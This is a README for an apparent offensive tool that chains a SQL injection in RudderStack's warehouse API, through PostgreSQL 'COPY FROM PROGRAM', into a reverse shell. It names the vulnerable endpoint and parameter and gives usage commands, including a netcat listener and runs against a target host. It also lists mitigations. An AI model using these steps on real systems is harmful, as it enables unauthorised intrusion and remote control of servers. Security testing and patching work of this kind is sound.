# RudderStack SQLi to RCE Exploit

A tool that exploits SQL injection vulnerabilities in RudderStack to achieve remote code execution (RCE). 

## Overview

This exploit targets a SQL injection vulnerability in RudderStack's Warehouse API endpoint. The vulnerability allows an attacker to execute arbitrary commands on the server by injecting malicious SQL code.

The script:
1. Creates a PostgreSQL-based reverse shell payload
2. Sends a crafted request to the vulnerable API endpoint
3. Executes commands on the target system
4. Returns a reverse shell to the attacker

## Features

- PostgreSQL SQL injection leading to RCE
- Configurable reverse shell parameters
- Support for proxy connections (including BurpSuite)
- Fallback mechanism for direct connections
- Detailed debugging options

## Requirements

- Python 3.6+
- Required Python packages:
  - requests
  - urllib3

## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/rudderstack-sqli.git
cd rudderstack-sqli
```

2. Make the script executable:
```bash
chmod +x rudderstack_sqli.py
```

## Usage

```
usage: rudderstack_sqli.py [-h] [-u URL] -lh LHOST -lp LPORT [-p PROXY]

SQLi to RCE in Rudderstack

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     RudderStack endpoint URL (default: rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true)
  -lh LHOST, --lhost LHOST
                        Your IP address for the reverse shell
  -lp LPORT, --lport LPORT
                        Your port for the reverse shell
  -p PROXY, --proxy PROXY
                        Proxy URL (e.g., 127.0.0.1:8080)
```

## Examples

### Basic usage:

```bash
# Start a listener on your machine first
nc -lvnp 4444

# Then run the exploit
./rudderstack_sqli.py --lhost 192.168.1.100 --lport 4444
```

### Using a custom RudderStack endpoint:

```bash
./rudderstack_sqli.py --url target.com:8080 --lhost 192.168.1.100 --lport 4444
```

### Using with BurpSuite:

```bash
./rudderstack_sqli.py --lhost 192.168.1.100 --lport 4444 --proxy 127.0.0.1:8080
```

## How It Works

1. The script crafts a SQL injection payload that:
   - Creates and uses a temporary table
   - Uses PostgreSQL's `COPY FROM PROGRAM` functionality to execute system commands
   - Establishes a reverse shell connection back to the attacker

2. The payload is sent to the vulnerable endpoint via the `source_id` parameter

3. When processed by the server, the injected SQL commands are executed within the context of the PostgreSQL database, which has sufficient privileges to run system commands

4. The reverse shell connects back to the specified host and port

## Mitigation

To protect against this vulnerability:

1. Apply the latest security patches for RudderStack
2. Implement proper input validation and parameterized queries
3. Limit database user privileges following the principle of least privilege
4. Configure network segmentation to restrict outbound connections from the database server

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. Usage of this tool against systems without explicit permission is illegal and unethical. The author assumes no liability for misuse of this software.

## Author

Aleksa Zaztezalo (May 2025)

## License

This project is licensed under the MIT License - see the LICENSE file for details.